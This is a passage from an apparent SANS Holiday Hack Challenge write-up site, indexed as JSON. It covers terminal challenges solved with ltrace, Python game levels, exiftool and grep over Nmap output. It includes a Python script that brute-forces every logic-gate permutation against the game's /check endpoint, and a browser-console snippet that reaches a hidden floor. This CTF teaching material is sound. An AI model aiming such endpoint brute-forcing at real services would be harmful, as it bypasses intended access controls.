file and compare it to several expected values, starting with Registration . Use the ltrace output to determine what the final string should look like and gradually update the configuration file's content using echo statements like we did in the previous step. After updating the contents of registration.json with Registration:True the program runs as expected! Response \u2693\ufe0e Tinsel Upatree Great! Thanks so much for your help! I'm sure I can put those skills I just learned from you to good use. Are you familiar with RFC3514 ? Wireshark uses a different name for the Evil Bit: ip.flags.rb . HTTP responses are often gzip compressed. Fortunately, Wireshark decompresses them for us automatically. You can search for strings in Wireshark fields using display filters with the contains keyword.","title":"Strace Ltrace Retrace"},{"location":"hints/h11/#strace-ltrace-retrace","text":"Elf : Tinsel Upatree Direct link : ltrace terminal Objective : Customer Complaint Analysis","title":"Strace Ltrace Retrace"},{"location":"hints/h11/#request","text":"Tinsel Upatree Hiya hiya, I'm Tinsel Upatree! Say, do you know what's going on next door? I'm a bit worried about the whole FrostFest event. It feels a bit... ill-conceived, somehow. Nasty even. Well, regardless \u2013 and more to the point, what do you know about tracing processes in Linux? We rebuilt this here Cranberry Pi that runs the cotton candy machine, but we seem to be missing a file. Do you think you can use strace or ltrace to help us rebuild the missing config? We'd like to help some of our favorite children enjoy the sweet spun goodness again! And, if you help me with this, I'll give you some hints about using Wireshark filters to look for unusual options that might help you achieve Objectives here at the North Pole.","title":"Request"},{"location":"hints/h11/#solution","text":"Welcome message ================================================================================ Please, we need your help! The cotton candy machine is broken! We replaced the SD card in the Cranberry Pi that controls it and reinstalled the software. Now it's complaining that it can't find a registration file! Perhaps you could figure out what the cotton candy software is looking for... ================================================================================ Debugging tools like ltrace allow us to trace a program's execution flow by intercepting all of the dynamic library and system calls the program makes. Its verbose output can help to determine where and why exactly things are going wrong. Start by running the program normally using ./make_the_candy to confirm we're indeed missing a configuration file. Use ltrace ./make_the_candy to trace the program's execution and reveal the expected file name is registration.json . Create the registration file with touch registration.json and run ltrace again. This time we get a different message telling us that the program is trying to get or read a line from the file. Since registration.json is still empty, this fails as well. So, add some dummy data using echo dummy > registration.json and keep repeating the process. From this point on the program will try to read data from the configuration file and compare it to several expected values, starting with Registration . Use the ltrace output to determine what the final string should look like and gradually update the configuration file's content using echo statements like we did in the previous step. After updating the contents of registration.json with Registration:True the program runs as expected!","title":"Solution"},{"location":"hints/h11/#response","text":"Tinsel Upatree Great! Thanks so much for your help! I'm sure I can put those skills I just learned from you to good use. Are you familiar with RFC3514 ? Wireshark uses a different name for the Evil Bit: ip.flags.rb . HTTP responses are often gzip compressed. Fortunately, Wireshark decompresses them for us automatically. You can search for strings in Wireshark fields using display filters with the contains keyword.","title":"Response"},{"location":"hints/h12/","text":"The Elf C0de \u2693\ufe0e Elf : Ribb Bonbowford Direct link : elfcode website Objective : Frost Tower Website Checkup Request \u2693\ufe0e Ribb Bonbowford Hello, I'm Ribb Bonbowford. Nice to meet you! Are you new to programming? It's a handy skill for anyone in cyber security. This here machine lets you control an Elf using Python 3. It's pretty fun, but I'm having trouble getting beyond Level 8. Tell you what\u2026 if you help me get past Level 8, I'll share some of my SQLi tips with you. You may find them handy sometime around the North Pole this season. Most of the information you'll need is provided during the game, but I'll give you a few more pointers, if you want them. Not sure what a lever requires? Click it in the Current Level Objectives panel. You can move the elf with commands like elf.moveLeft(5) , elf.moveTo({\"x\":2,\"y\":2}) , or elf.moveTo(lever0.position) . Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. You can call functions like myFunction() . If you ever need to pass a function to a munchkin, you can use myFunction without the () . Hints \u2693\ufe0e Moving the Elf You can move the elf with commands like elf.moveLeft(5) , elf.moveTo({\"x\":2,\"y\":2}) , or elf.moveTo(lever0.position) . Lever Requirements Not sure what a lever requires? Click it in the Current Level Objectives panel. Bumping into Walls Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. Function Calls You can call functions like myFunction() . If you ever need to pass a function to a munchkin, you can use myFunction without the () . Solution \u2693\ufe0e This is a similar challenge to last year's event, but using Python instead of JavaScript. Only the first 8 levels count towards solving the challenge. Bonus levels 9 and 10 are not required (but are a lot of fun). Some of the scripts include additional empty lines to enhance readability, but all solutions still fit within the maximum line requirements. Main levels \u2693\ufe0e Level 1 1 2 3 import elf , munchkins , levers , lollipops , yeeters , pits elf . moveLeft ( 10 ) elf . moveUp ( 100 ) Level 2 1 2 3 4 5 import elf , munchkins , levers , lollipops , yeeters , pits elf . moveTo ( lollipops . get ( 1 ) . position ) elf . moveTo ( lollipops . get ( 0 ) . position ) elf . moveLeft ( 3 ) elf . moveUp ( 100 ) Level 3 1 2 3 4 5 6 import elf , munchkins , levers , lollipops , yeeters , pits lever = levers . get ( 0 ) elf . moveTo ( lever . position ) lever . pull ( lever . data () + 2 ) elf . moveTo ( lollipops . get ( 0 ) . position ) elf . moveUp ( 100 ) Level 4 1 2 3 4 5 6 7 8 import elf , munchkins , levers , lollipops , yeeters , pits data = [{}, [], 1 , True , \"A String\" ] for i in [ 4 , 3 , 2 , 1 , 0 ]: elf . moveTo ( levers . get ( i ) . position ) levers . get ( i ) . pull ( data [ i ]) elf . moveUp ( 100 ) Level 5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import elf , munchkins , levers , lollipops , yeeters , pits lever0 , lever1 , lever2 , lever3 , lever4 = levers . get () elf . moveTo ( lever4 . position ) lever4 . pull ( lever4 . data () + \" concatenate\" ) elf . moveTo ( lever3 . position ) lever3 . pull ( not lever3 . data ()) elf . moveTo ( lever2 . position ) lever2 . pull ( lever2 . data () + 1 ) elf . moveTo ( lever1 . position ) data = lever1 . data () data . append ( 1 ) lever1 . pull ( data ) elf . moveTo ( lever0 . position ) data = lever0 . data () data [ 'strkey' ] = 'strvalue' lever0 . pull ( data ) elf . moveUp ( 100 ) Level 6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 import elf , munchkins , levers , lollipops , yeeters , pits lever = levers . get ( 0 ) data = lever . data () if type ( data ) == bool : data = not data elif type ( data ) == int : data = data * 2 elif type ( data ) == list : data = [ x + 1 for x in data ] elif type ( data ) == str : data += data elif type ( data ) == dict : data [ 'a' ] += 1 elf . moveTo ( lever . position ) lever . pull ( data ) elf . moveUp ( 100 ) Level 7 1 2 3 4 5 6 import elf , munchkins , levers , lollipops , yeeters , pits action = [ elf . moveUp , elf . moveDown ] for num in range ( 5 ): elf . moveLeft ( 3 ) action [ num % 2 ]( 15 ) Level 8 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import elf , munchkins , levers , lollipops , yeeters , pits for lollipop in lollipops . get (): elf . moveTo ( lollipop . position ) elf . moveLeft ( 8 ) elf . moveUp ( 2 ) munchkin = munchkins . get ( 0 ) munch_dict = munchkin . ask () while munchkin . position [ \"y\" ] - elf . position [ 'y' ] > 1 : time . sleep ( 0.05 ) munchkin . answer ( list ( munch_dict . keys ())[ list ( munch_dict . values ()) . index ( 'lollipop' )]) elf . moveUp ( 100 ) Bonus levels \u2693\ufe0e Level 9 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import elf , munchkins , levers , lollipops , yeeters , pits def tally_ints ( list_of_lists ): the_sum = 0 for a_list in list_of_lists : for item in a_list : if type ( item ) == int : the_sum += item return the_sum all_levers = levers . get () moves = [ elf . moveDown , elf . moveLeft , elf . moveUp , elf . moveRight ] * 2 for i , move in enumerate ( moves ): move ( i + 1 ) if i < len ( all_levers ): all_levers [ i ] . pull ( i ) elf . moveUp ( 2 ) elf . moveLeft ( 4 ) munchkin = munchkins . get ( 0 ) munchkin . answer ( tally_ints ) elf . moveUp ( 100 ) Level 10 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import elf , munchkins , levers , lollipops , yeeters , pits import time muns = munchkins . get () steps_horiz = [ 3 , 4 , 4 , 4 ] move_horiz = [ elf . moveLeft , elf . moveRight ] * 2 for index , mun in enumerate ( muns ): while abs ( elf . position [ \"x\" ] - mun . position [ 'x' ]) < 6 : time . sleep ( 0.05 ) move_horiz [ index ]( steps_horiz [ index ]) elf . moveUp ( 2 ) elf . moveLeft ( 6 ) elf . moveUp ( 100 ) Response \u2693\ufe0e Ribb Bonbowford Gosh, with skills like that, I'll bet you could help figure out what's really going on next door... And, as I promised, let me tell you what I know about SQL injection. I hear that having source code for vulnerability discovery dramatically changes the vulnerability discovery process. I imagine it changes how you approach an assessment too. When you have the source code, API documentation becomes tremendously valuable . Who knows? Maybe you'll even find more than one vulnerability in the code. Wow - even the bonus levels! That's amazing!","title":"The Elf C0de"},{"location":"hints/h12/#the-elf-c0de","text":"Elf : Ribb Bonbowford Direct link : elfcode website Objective : Frost Tower Website Checkup","title":"The Elf C0de"},{"location":"hints/h12/#request","text":"Ribb Bonbowford Hello, I'm Ribb Bonbowford. Nice to meet you! Are you new to programming? It's a handy skill for anyone in cyber security. This here machine lets you control an Elf using Python 3. It's pretty fun, but I'm having trouble getting beyond Level 8. Tell you what\u2026 if you help me get past Level 8, I'll share some of my SQLi tips with you. You may find them handy sometime around the North Pole this season. Most of the information you'll need is provided during the game, but I'll give you a few more pointers, if you want them. Not sure what a lever requires? Click it in the Current Level Objectives panel. You can move the elf with commands like elf.moveLeft(5) , elf.moveTo({\"x\":2,\"y\":2}) , or elf.moveTo(lever0.position) . Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. You can call functions like myFunction() . If you ever need to pass a function to a munchkin, you can use myFunction without the () .","title":"Request"},{"location":"hints/h12/#hints","text":"Moving the Elf You can move the elf with commands like elf.moveLeft(5) , elf.moveTo({\"x\":2,\"y\":2}) , or elf.moveTo(lever0.position) . Lever Requirements Not sure what a lever requires? Click it in the Current Level Objectives panel. Bumping into Walls Looping through long movements? Don't be afraid to moveUp(99) or whatever. You elf will stop at any obstacle. Function Calls You can call functions like myFunction() . If you ever need to pass a function to a munchkin, you can use myFunction without the () .","title":"Hints"},{"location":"hints/h12/#solution","text":"This is a similar challenge to last year's event, but using Python instead of JavaScript. Only the first 8 levels count towards solving the challenge. Bonus levels 9 and 10 are not required (but are a lot of fun). Some of the scripts include additional empty lines to enhance readability, but all solutions still fit within the maximum line requirements.","title":"Solution"},{"location":"hints/h12/#response","text":"Ribb Bonbowford Gosh, with skills like that, I'll bet you could help figure out what's really going on next door... And, as I promised, let me tell you what I know about SQL injection. I hear that having source code for vulnerability discovery dramatically changes the vulnerability discovery process. I imagine it changes how you approach an assessment too. When you have the source code, API documentation becomes tremendously valuable . Who knows? Maybe you'll even find more than one vulnerability in the code. Wow - even the bonus levels! That's amazing!","title":"Response"},{"location":"hints/h13/","text":"Frostavator \u2693\ufe0e Elf : Grody Goiterson Direct link : frostavator website Objective : FPGA Programming Request \u2693\ufe0e Grody Goiterson Hrmph. Snrack! Pthbthbthb. Gnerphk. Well, on to business. I'm Grody Goiterson. ... It's a family name. So hey, this is the Frostavator. It runs on some logic chips... that fell out. I put them back in, but I must have mixed them up, because it isn't working now. If you don't know much about logic gates, it's something you should look up. If you help me run the elevator, maybe I can help you with something else. I'm pretty good with FPGAs, if that's worth something to ya'. Hints \u2693\ufe0e Logic Gate Iconography This Solution \u2693\ufe0e There's three ways to approach this. The first option is to ignore the elevator and just use the stairs. Option two is take the time to learn about logic gates and drag and drop the components on the Frostavator panel around until we end up with a valid solution. The final option is to bruteforce the Frostavator and compile a list of all the valid panel layouts. The first leaves us without a hint, the second is the most educational, the third however is probably the most fun! The app.js code tells us that the panel layout is stored as an Array of 6 integers ranging from 0 to 5. The code first tries to load the data from a local storage variable called frostavatorData . If that's not available, the layout defaults to [4, 3, 5, 0, 1, 2]. Each number in the list corresponds with a type of logic gate, while the number's position in the list defines its location on the panel. Each time we drag one of the ICs around and let go of the mouse button, the gateCheck() function is executed which validates the current panel layout. If everything checks out the layout is then sent via a POST request to /check . While the POST request is shielded by some validation logic in app.js , all it really requires as input is an ID and a list representation of a panel layout. We can confirm this by sending a manual POST request and capturing the response. POST request with an invalid layout POST request with a valid layout An invalid panel layout returns a result field set to false . Generating all 720 permutations of [0, 1, 2, 3, 4, 5] and sending each one to the /check endpoint for validation will at some point respond with a hash field and value, indicating that particular sequence is a valid one. Now that we know the difference between valid and invalid, we can finalize our automation. bruteforce_frostavator.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 #!/usr/bin/env python import asyncio import itertools import random from typing import Optional , Tuple import aiohttp import click import tqdm GATES = [ 'AND' , 'NAND' , 'OR' , 'NOR' , 'XOR' , 'XNOR' ] def create_ascii_board ( layout : list ): \"\"\"Print an ASCII board layout.\"\"\" g0 = f \" { GATES [ layout [ 0 ]] : ^6 } \" g1 = f \" { GATES [ layout [ 1 ]] : ^6 } \" g2 = f \" { GATES [ layout [ 2 ]] : ^6 } \" g3 = f \" { GATES [ layout [ 3 ]] : ^6 } \" g4 = f \" { GATES [ layout [ 4 ]] : ^6 } \" g5 = f \" { GATES [ layout [ 5 ]] : ^6 } \" return ( \"Logic board layout: \\n\\n \" \" +------+ +------+ +------+ \\n \" f \" | { g0 } | | { g1 } | | { g2 } | \\n \" \" +------+ +------+ +------+ \\n \" \" +------+ +------+ +------+ \\n \" f \" | { g3 } | | { g4 } | | { g5 } | \\n \" \" +------+ +------+ +------+\" ) async def fetch ( session : aiohttp . ClientSession , perm : Tuple [ int , ... ]) -> Tuple [ Optional [ str ], Tuple [ int , ... ]]: \"\"\"Have the Frostavator check a single permutation.time\"\"\" url = \"https://frostavator21.kringlecastle.com/check\" headers = { 'dataType' : 'json' , 'contentType' : 'application/json' } data = { 'id' : \"abc-123\" , 'config' : perm } async with session . post ( url , headers = headers , json = data ) as response : resp = await response . json () return resp . get ( 'hash' , None ), perm async def bruteforce ( pick_one : bool ): \"\"\"Bruteforce the Frostavator.\"\"\" async with aiohttp . ClientSession () as session : # Calculate all possible permutations for the 6 logic gates perms = itertools . permutations ([ 0 , 1 , 2 , 3 , 4 , 5 ]) # Send out a '/check' request for each permutation tasks = [] for perm in perms : tasks . append ( asyncio . create_task ( fetch ( session , perm ))) # Gather the results results = [] bar_format = \" {l_bar}{bar:30} | {n_fmt} / {total_fmt} [ {elapsed} ]\" progressbar = tqdm . tqdm ( asyncio . as_completed ( tasks ), total = len ( tasks ), bar_format = bar_format ) progressbar . set_description ( \"Frostavating\" ) for step in progressbar : results . append ( await step ) # Filter out invalid values valids = [ x [ 1 ] for x in results if x [ 0 ]] if pick_one : # Print one random entry winner = list ( valids [ random . randrange ( 0 , len ( valids ))]) print ( f \"frostavatorData: { winner } \" ) print ( create_ascii_board ( winner )) else : # Print all entries print ( f \"All { len ( valids ) } valid 'frostavatorData' values:\" ) for valid in valids : print ( f \" { list ( valid ) } or { [ GATES [ x ] for x in valid ] } \" ) @click . command () @click . option ( '--pick-one' , is_flag = True , help = 'Show a single solution and logic board layout.' ) def cli ( pick_one : bool ): asyncio . run ( bruteforce ( pick_one )) if __name__ == '__main__' : cli () Using the custom bruteforce_frostavator.py script we end up with 72 valid panel layouts. In other words, if you opted for randomly dragging ICs around to solve this challenge, you had a 1 in 10 chance of hitting a valid layout. To make life a little easier, the script also supports a --pick-one option which prints an additional ASCII panel layout. Now that we know all the valid layouts , we can copy one of the solutions from the script output into the frostavatorData local storage variable and reload the page to have the JavaScript code pick up the new value. Alternatively, we can drag and drop the ICs on the panel to match the ASCII representation provided by the --pick-one option. Secret __Shenanigans__ area There's a note on the Frostavator panel telling us that the residential floors aren't accessible during FrostFest. But hey, might as well poke around at that panel some more, right? Use your web browser's console to set targetFloor to an unused value (line 1) and run the below code snippet taken from app.js . You'll be taken to a hidden __Shenanigans__ area. See the Easter Eggs section for additional details. This works for both the Santavator and Frostavator. Change to another floor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 targetFloor = 100 $ . ajax ({ type : 'POST' , url : POST_URL , dataType : 'json' , contentType : 'application/json' , data : JSON . stringify ({ targetFloor , id : getParams . id , }), success : ( res , status ) => { if ( res . hash ) { __POST_RESULTS__ ({ resourceId : getParams . id || '1111' , hash : res . hash , action : `goToFloor- ${ targetFloor } ` , }); closeChallenge (); } } }); Response \u2693\ufe0e Grody Goiterson Oooo... That's it! A deal's a deal. Let's talk FPGA. First, did you know there are people who do this stuff for fun ?? I mean, I'm more into picking on other trolls for fun, but whatever. Also, that Prof. Petabyte guy is giving a talk about FPGAs. Weirdo. So hey, good luck or whatever.","title":"Frostavator"},{"location":"hints/h13/#frostavator","text":"Elf : Grody Goiterson Direct link : frostavator website Objective : FPGA Programming","title":"Frostavator"},{"location":"hints/h13/#request","text":"Grody Goiterson Hrmph. Snrack! Pthbthbthb. Gnerphk. Well, on to business. I'm Grody Goiterson. ... It's a family name. So hey, this is the Frostavator. It runs on some logic chips... that fell out. I put them back in, but I must have mixed them up, because it isn't working now. If you don't know much about logic gates, it's something you should look up. If you help me run the elevator, maybe I can help you with something else. I'm pretty good with FPGAs, if that's worth something to ya'.","title":"Request"},{"location":"hints/h13/#hints","text":"Logic Gate Iconography This","title":"Hints"},{"location":"hints/h13/#solution","text":"There's three ways to approach this. The first option is to ignore the elevator and just use the stairs. Option two is take the time to learn about logic gates and drag and drop the components on the Frostavator panel around until we end up with a valid solution. The final option is to bruteforce the Frostavator and compile a list of all the valid panel layouts. The first leaves us without a hint, the second is the most educational, the third however is probably the most fun! The app.js code tells us that the panel layout is stored as an Array of 6 integers ranging from 0 to 5. The code first tries to load the data from a local storage variable called frostavatorData . If that's not available, the layout defaults to [4, 3, 5, 0, 1, 2]. Each number in the list corresponds with a type of logic gate, while the number's position in the list defines its location on the panel. Each time we drag one of the ICs around and let go of the mouse button, the gateCheck() function is executed which validates the current panel layout. If everything checks out the layout is then sent via a POST request to /check . While the POST request is shielded by some validation logic in app.js , all it really requires as input is an ID and a list representation of a panel layout. We can confirm this by sending a manual POST request and capturing the response. POST request with an invalid layout POST request with a valid layout An invalid panel layout returns a result field set to false . Generating all 720 permutations of [0, 1, 2, 3, 4, 5] and sending each one to the /check endpoint for validation will at some point respond with a hash field and value, indicating that particular sequence is a valid one. Now that we know the difference between valid and invalid, we can finalize our automation. bruteforce_frostavator.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 #!/usr/bin/env python import asyncio import itertools import random from typing import Optional , Tuple import aiohttp import click import tqdm GATES = [ 'AND' , 'NAND' , 'OR' , 'NOR' , 'XOR' , 'XNOR' ] def create_ascii_board ( layout : list ): \"\"\"Print an ASCII board layout.\"\"\" g0 = f \" { GATES [ layout [ 0 ]] : ^6 } \" g1 = f \" { GATES [ layout [ 1 ]] : ^6 } \" g2 = f \" { GATES [ layout [ 2 ]] : ^6 } \" g3 = f \" { GATES [ layout [ 3 ]] : ^6 } \" g4 = f \" { GATES [ layout [ 4 ]] : ^6 } \" g5 = f \" { GATES [ layout [ 5 ]] : ^6 } \" return ( \"Logic board layout: \\n\\n \" \" +------+ +------+ +------+ \\n \" f \" | { g0 } | | { g1 } | | { g2 } | \\n \" \" +------+ +------+ +------+ \\n \" \" +------+ +------+ +------+ \\n \" f \" | { g3 } | | { g4 } | | { g5 } | \\n \" \" +------+ +------+ +------+\" ) async def fetch ( session : aiohttp . ClientSession , perm : Tuple [ int , ... ]) -> Tuple [ Optional [ str ], Tuple [ int , ... ]]: \"\"\"Have the Frostavator check a single permutation.time\"\"\" url = \"https://frostavator21.kringlecastle.com/check\" headers = { 'dataType' : 'json' , 'contentType' : 'application/json' } data = { 'id' : \"abc-123\" , 'config' : perm } async with session . post ( url , headers = headers , json = data ) as response : resp = await response . json () return resp . get ( 'hash' , None ), perm async def bruteforce ( pick_one : bool ): \"\"\"Bruteforce the Frostavator.\"\"\" async with aiohttp . ClientSession () as session : # Calculate all possible permutations for the 6 logic gates perms = itertools . permutations ([ 0 , 1 , 2 , 3 , 4 , 5 ]) # Send out a '/check' request for each permutation tasks = [] for perm in perms : tasks . append ( asyncio . create_task ( fetch ( session , perm ))) # Gather the results results = [] bar_format = \" {l_bar}{bar:30} | {n_fmt} / {total_fmt} [ {elapsed} ]\" progressbar = tqdm . tqdm ( asyncio . as_completed ( tasks ), total = len ( tasks ), bar_format = bar_format ) progressbar . set_description ( \"Frostavating\" ) for step in progressbar : results . append ( await step ) # Filter out invalid values valids = [ x [ 1 ] for x in results if x [ 0 ]] if pick_one : # Print one random entry winner = list ( valids [ random . randrange ( 0 , len ( valids ))]) print ( f \"frostavatorData: { winner } \" ) print ( create_ascii_board ( winner )) else : # Print all entries print ( f \"All { len ( valids ) } valid 'frostavatorData' values:\" ) for valid in valids : print ( f \" { list ( valid ) } or { [ GATES [ x ] for x in valid ] } \" ) @click . command () @click . option ( '--pick-one' , is_flag = True , help = 'Show a single solution and logic board layout.' ) def cli ( pick_one : bool ): asyncio . run ( bruteforce ( pick_one )) if __name__ == '__main__' : cli () Using the custom bruteforce_frostavator.py script we end up with 72 valid panel layouts. In other words, if you opted for randomly dragging ICs around to solve this challenge, you had a 1 in 10 chance of hitting a valid layout. To make life a little easier, the script also supports a --pick-one option which prints an additional ASCII panel layout. Now that we know all the valid layouts , we can copy one of the solutions from the script output into the frostavatorData local storage variable and reload the page to have the JavaScript code pick up the new value. Alternatively, we can drag and drop the ICs on the panel to match the ASCII representation provided by the --pick-one option. Secret __Shenanigans__ area There's a note on the Frostavator panel telling us that the residential floors aren't accessible during FrostFest. But hey, might as well poke around at that panel some more, right? Use your web browser's console to set targetFloor to an unused value (line 1) and run the below code snippet taken from app.js . You'll be taken to a hidden __Shenanigans__ area. See the Easter Eggs section for additional details. This works for both the Santavator and Frostavator. Change to another floor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 targetFloor = 100 $ . ajax ({ type : 'POST' , url : POST_URL , dataType : 'json' , contentType : 'application/json' , data : JSON . stringify ({ targetFloor , id : getParams . id , }), success : ( res , status ) => { if ( res . hash ) { __POST_RESULTS__ ({ resourceId : getParams . id || '1111' , hash : res . hash , action : `goToFloor- ${ targetFloor } ` , }); closeChallenge (); } } });","title":"Solution"},{"location":"hints/h13/#response","text":"Grody Goiterson Oooo... That's it! A deal's a deal. Let's talk FPGA. First, did you know there are people who do this stuff for fun ?? I mean, I'm more into picking on other trolls for fun, but whatever. Also, that Prof. Petabyte guy is giving a talk about FPGAs. Weirdo. So hey, good luck or whatever.","title":"Response"},{"location":"hints/h2/","text":"Document Analysis \u2693\ufe0e Elf : Piney Sappington Direct link : exif terminal Objective : Where in the World is Caramel Santaigo? Request \u2693\ufe0e Piney Sappington Hi ho, Piney Sappington at your service! Well, honestly, I could use a touch of your services. You see, I've been looking at these documents, and I know someone has tampered with one file. Do you think you could log into this Cranberry Pi and take a look? It has exiftool installed on it, if that helps you at all. I just... Well, I have a feeling that someone at that other conference might have fiddled with things. And, if you help me figure this tampering issue out, I'll give you some hints about OSINT, especially associated with geographic locations! Solution \u2693\ufe0e Welcome message HELP! That wily Jack Frost modified one of our naughty/nice records, and right before Christmas! Can you help us figure out which one? We've installed exiftool for your convenience! Filename (including .docx extension) > Using exiftool we can check the Last Modified By field in each document's metadata to verify who tampered with it last. For convenience we pipe the output to tail -7 to only print the last 7 lines. 2021-12-21.docx stands out from the rest because it shows that Jack Frost was the one who made the final edit and not Santa Claus. Instead of manually checking each file, we can also write a short Bash script which loops over each file (line 2) and retrieves the Last Modified By property from the document's metadata if it doesn't contain the word santa ( line 3 ). When there's a match, the filename and the Last Modified By information are printed (lines 5-6). find_file.sh 1 2 3 4 5 6 7 8 #!/usr/bin/env bash for f in $( ls *.docx ) ; do match = $( exiftool $f | grep -i 'last modified by' | grep -iv 'santa' ) if [[ ! -z \" $match \" ]] ; then echo $f ; echo $match ; fi done Looking at the file's revision history , it appears that Jack Frost added Noxious O. D'or to the top of the Nice list! Answer 2021-12-21.docx Response \u2693\ufe0e Piney Sappington Wow, you figured that out in no time! Thanks! I knew they were up to no good. So hey, have you tried the Caramel Santaigo game in this courtyard? Carmen? No, I haven't heard of her. So anyway, some of the hints use obscure coordinate systems like MGRS and even what3words . In some cases, you might get an image with location info in the metadata. Good thing you know how to see that stuff now! (And they say, for those who don't like gameplay, there might be a way to bypass by looking at some flavor of cookie...) Oh, and don't forget to learn about your target elf and filter in the Interrink system!","title":"Document Analysis"},{"location":"hints/h2/#document-analysis","text":"Elf : Piney Sappington Direct link : exif terminal Objective : Where in the World is Caramel Santaigo?","title":"Document Analysis"},{"location":"hints/h2/#request","text":"Piney Sappington Hi ho, Piney Sappington at your service! Well, honestly, I could use a touch of your services. You see, I've been looking at these documents, and I know someone has tampered with one file. Do you think you could log into this Cranberry Pi and take a look? It has exiftool installed on it, if that helps you at all. I just... Well, I have a feeling that someone at that other conference might have fiddled with things. And, if you help me figure this tampering issue out, I'll give you some hints about OSINT, especially associated with geographic locations!","title":"Request"},{"location":"hints/h2/#solution","text":"Welcome message HELP! That wily Jack Frost modified one of our naughty/nice records, and right before Christmas! Can you help us figure out which one? We've installed exiftool for your convenience! Filename (including .docx extension) > Using exiftool we can check the Last Modified By field in each document's metadata to verify who tampered with it last. For convenience we pipe the output to tail -7 to only print the last 7 lines. 2021-12-21.docx stands out from the rest because it shows that Jack Frost was the one who made the final edit and not Santa Claus. Instead of manually checking each file, we can also write a short Bash script which loops over each file (line 2) and retrieves the Last Modified By property from the document's metadata if it doesn't contain the word santa ( line 3 ). When there's a match, the filename and the Last Modified By information are printed (lines 5-6). find_file.sh 1 2 3 4 5 6 7 8 #!/usr/bin/env bash for f in $( ls *.docx ) ; do match = $( exiftool $f | grep -i 'last modified by' | grep -iv 'santa' ) if [[ ! -z \" $match \" ]] ; then echo $f ; echo $match ; fi done Looking at the file's revision history , it appears that Jack Frost added Noxious O. D'or to the top of the Nice list! Answer 2021-12-21.docx","title":"Solution"},{"location":"hints/h2/#response","text":"Piney Sappington Wow, you figured that out in no time! Thanks! I knew they were up to no good. So hey, have you tried the Caramel Santaigo game in this courtyard? Carmen? No, I haven't heard of her. So anyway, some of the hints use obscure coordinate systems like MGRS and even what3words . In some cases, you might get an image with location info in the metadata. Good thing you know how to see that stuff now! (And they say, for those who don't like gameplay, there might be a way to bypass by looking at some flavor of cookie...) Oh, and don't forget to learn about your target elf and filter in the Interrink system!","title":"Response"},{"location":"hints/h3/","text":"Grepping for Gold \u2693\ufe0e Elf : Greasy GopherGuts Direct link : gnmap terminal Objective : Thaw Frost Tower's Entrance Request \u2693\ufe0e Greasy GopherGuts Grnph. Blach! Phlegm. I'm Greasy Gopherguts. I need help with parsing some Nmap output. If you help me find some results, I'll give you some hints about Wi-Fi. Click on the terminal next to me and read the instructions. Maybe search for a cheat sheet if the hints in the terminal don't do it for ya'. You'll type quizme in the terminal and grep through the Nmap bigscan.gnmap file to find answers. Hints \u2693\ufe0e Grep Cheat Sheet Check this out if you need a grep refresher. Solution \u2693\ufe0e Welcome message Howdy howdy! Mind helping me with this homew- er, challenge? Someone ran nmap -oG on a big network and produced this bigscan.gnmap file. The quizme program has the questions and hints and, incidentally, has NOTHING to do with an Elf University assignment. Thanks! Answer all the questions in the quizme executable: - What port does 34.76.1.22 have open? - What port does 34.77.207.226 have open? - How many hosts appear \"Up\" in the scan? - How many hosts have a web port open? (Let's just use TCP ports 80, 443, and 8080) - How many hosts with status Up have no (detected) open TCP ports? - What's the greatest number of TCP ports any one host has open? Check out bigscan.gnmap and type quizme to answer each question. Many of the terminals at KringleCon are designed to help you get acquainted with a specific technology or tool. Last year it was a Linux primer , this time around we get to learn all about grep . The Answers section below provides a copy/pastable overview of all commands. All entries also link to explainshell.com which provides a more in-depth explanation. Oh, and if you don't have time for all of that, scroll down a little... Answers Q: What port does 34.76.1.22 have open? C: grep '34.76.1.22' bigscan.gnmap A: 62078 Q: What port does 34.77.207.226 have open? C: grep '34.77.207.226' bigscan.gnmap A: 8080 Q: How many hosts appear \"Up\" in the scan? C: grep -i 'Status: Up' bigscan.gnmap | wc -l A: 26054 Q: How many hosts have a web port open? (Let's just use TCP ports 80, 443, and 8080) C: grep '80/open/tcp\\|443/open/tcp\\|8080/open/tcp' bigscan.gnmap | wc -l A: 14372 Q: How many hosts with status Up have no (detected) open TCP ports? C: echo $(expr $(grep -i 'Status: Up' bigscan.gnmap | wc -l) - $(grep -i '/open/' bigscan.gnmap | wc -l)) A: 402 Q: What's the greatest number of TCP ports any one host has open? C: grep -E '(.*/open/.*///,?\\s){12}' bigscan.gnmap and grep -E '(.*/open/.*///,?\\s){13}' bigscan.gnmap A: 12 Extracting the answers from the quizme binary If putting in the time and effort to learn about grep isn't your thing, then you're in luck! Someone was nice enough to leave a copy of pyi-archive_viewer in /usr/local/bin which you can use to inspect and extract data from executables created with PyInstaller , like /usr/bin/quizme . Start by using pyi-archive_viewer /usr/bin/quizme to view all available components in the quizme binary. Next, extract the quizme component and save it to quizme.bin using x quizme . Finally, use strings quizme.bin | grep question | jq to extract the answers from the quizme.bin file. Response \u2693\ufe0e Greasy GopherGuts Grack. Ungh. ... Oh! You really did it? Well, OK then. Here's what I know about the wifi here. Scanning for Wi-Fi networks with iwlist will be location-dependent. You may need to move around the North Pole and keep scanning to identify a Wi-Fi network. Wireless in Linux is supported by many tools, but iwlist and iwconfig are commonly used at the command line. The curl 